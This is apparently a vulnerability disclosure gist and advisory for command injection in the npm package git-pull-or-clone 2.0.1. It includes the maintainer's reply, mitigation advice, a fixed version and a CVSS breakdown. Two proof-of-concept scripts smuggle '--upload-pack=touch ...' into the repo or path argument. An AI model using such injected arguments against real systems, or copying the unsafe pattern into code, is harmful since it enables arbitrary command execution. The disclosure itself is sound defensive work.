Command Injection vulnerability in git-clone-or-pull@2.0.1

 [Raw](/lirantal/327e9dd32686991b5a1fa6341aac2e7b/raw/6ca719b92381ea377e1484f943ea6bfecfb0834e/git-clone-or-pull-command-injection.md)

# Command Injection vulnerability in git-clone-or-pull@2.0.1

`git-clone-or-pull` describes itself as a tool to ensure a git repo exists on disk and that it's up-to-date.

Resources:

* Project's GitHub source code: <https://github.com/feross/git-pull-or-clone>
* Project's npm package: <https://npmjs.org/package/git-pull-or-clone>

## Background on exploitation

I'm reporting a Command Injection vulnerability in `git-clone-or-pull` npm package.

A use of the `--upload-pack` feature of git is also supported for `git clone`, and allows users to execute arbitrary commands on the OS.

The source includes the use of the secure child process API `spawn()` (see here: <https://github.com/feross/git-pull-or-clone/blob/master/index.js#L28-L33>) however the `outpath` parameter passed to it may be a command line argument to the `git clone` command and result in arbitrary command injection.

If users are in control either of the url (`url`) to clone, or the directory path (`outPath`) to clone it to then the vulnerability applies.

## New exploit

Install `git-clone-or-pull@2.0.1`, which is the latest.

POC 1:

```
const gitPullOrClone = require('git-pull-or-clone')
const repo = 'file:///tmp/zero12345'
const path = '--upload-pack=touch /tmp/pwn3'
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})
```

Observe a new file created: `/tmp/pwn3`

POC 2:

```
const gitPullOrClone = require('git-pull-or-clone')
const repo = '--upload-pack=touch /tmp/pwn4'
const path = 'file:///tmp/zero12345'
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})
```

Observe a new file created: `/tmp/pwn4`

[@lirantal](https://github.com/lirantal) Thanks for the report. What's your current recommendation for escaping untrusted shell arguments in Node.js? Would you be willing to send a PR to fix this issue?

Also, one note:

> git-clone receives about 230,000 downloads a week so this report should probably be timely.

The `git-pull-or-clone` package has only 232 weekly downloads, not 230,000 downloads as stated.

Cheers,

Feross

Sorry, something went wrong.

Hi buddy! Thanks for replying promptly on this. I'm happy to help on this and will suggest the following strategies to mitigate the issue:

1. By applying a little Unix foo, you can tell a program to stop parsing input as arguments to the program, and everything that comes after it is simply positional arguments. This is done using the double dash (`--`) notation, for example: `git clone -- <repo> <directory>`, in which case even if a user controls the value, it won't be treated as an argument to `git clone`.
2. Apply schema matching for expected data. For example, ensure that a repo is indeed input that complies with a supported schema, such as starting with `git@` or with `https://` as an example. You can also harden the input by checking that it indeed exists on disk before you pass that input to `git clone`.

I haven't prepared a fix in advance and being almost 11pm here it's not something I could establish prompt but will do my best to clear our some of the schedules between tomorrow and Thursday to send you a patch.

p.s. it seems like I have accidentally disclosed another module that is vulnerable to this and the team has been reaching out to them too so I appreciate it if you indeed don't share anything about that. I updated this gist to remove that mention. Thanks!

Sorry, something went wrong.

Busy week on all fronts, Java and JavaScript! :D

Here's a patch for adding the relevant test cases and fixing the vulnerability per the above suggestion as pointed out in (1). You may choose to further harden it with ideas I shared in (2).

You can review the patch here and when you're good to be on stand-by for a quick merge and push a release I'd be happy to send a Pull Request over to the repo.

Upgrade `git-pull-or-clone` to version 2.0.2 or higher.

## Overview

[git-pull-or-clone](https://www.npmjs.org/package/git-pull-or-clone) is an Ensure a git repo exists on disk and that it's up-to-date

Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to the use of the `--upload-pack` feature of git which is also supported for git clone. The source includes the use of the secure child process API spawn(). However, the `outpath` parameter passed to it may be a command-line argument to the `git clone` command and result in arbitrary command injection.

## PoC 1

```
const gitPullOrClone = require('git-pull-or-clone')
const repo = 'file:///tmp/zero12345'
const path = '--upload-pack=touch /tmp/pwn3'
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})

```
## PoC 2

```
const gitPullOrClone = require('git-pull-or-clone')
const repo = '--upload-pack=touch /tmp/pwn4'
const path = 'file:///tmp/zero12345'
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})

```

9.8 critical

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
